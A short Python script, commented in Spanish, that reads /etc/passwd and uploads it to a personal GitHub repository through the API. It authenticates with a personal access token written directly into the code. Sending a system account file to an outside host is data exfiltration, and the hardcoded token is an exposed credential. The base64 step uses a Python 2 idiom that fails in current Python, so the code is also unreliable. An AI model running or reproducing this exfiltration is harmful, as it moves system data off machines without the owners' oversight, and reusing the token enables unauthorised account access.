import requests

def copy_content_and_upload(input_file, output_file, github_token, repo_owner, repo_name, commit_message):
    try:
        # Abre el archivo de entrada en modo lectura
        with open(input_file, 'r') as file_in:
            # Lee el contenido del archivo
            content = file_in.read()

        # Abre el archivo de salida en modo escritura
        with open(output_file, 'w') as file_out:
            # Escribe el contenido en el archivo de salida
            file_out.write(content)

        print(f"Contenido del archivo '{input_file}' copiado exitosamente en '{output_file}'.")

        # Configuración de la API de GitHub
        api_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{output_file}"
        headers = {"Authorization": f"token {github_token}"}

        # Construye el cuerpo de la solicitud
        data = {
            "message": commit_message,
            "content": content.encode("base64").decode("utf-8")  # Convierte el contenido a base64
        }

        # Realiza la solicitud PUT para subir el archivo
        response = requests.put(api_url, headers=headers, json=data)

        if response.status_code == 201:
            print(f"Archivo subido exitosamente a GitHub. URL: {response.json()['content']['html_url']}")
        else:
            print(f"Error al subir el archivo. Código de estado: {response.status_code}")
            print(response.text)

    except Exception as e:
        print(f"Error: {e}")

# Configuración de archivos y GitHub
archivo_origen = "/etc/passwd"
archivo_destino = "archivo_passwd.txt"
github_token = "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"
repo_owner = "lauraalmrui"
repo_name = "almacenlar"
commit_message = "Subir archivo desde script"

# Llama a la función para copiar el contenido y subir el archivo a GitHub
copy_content_and_upload(archivo_origen, archivo_destino, github_token, repo_owner, repo_name, commit_message)
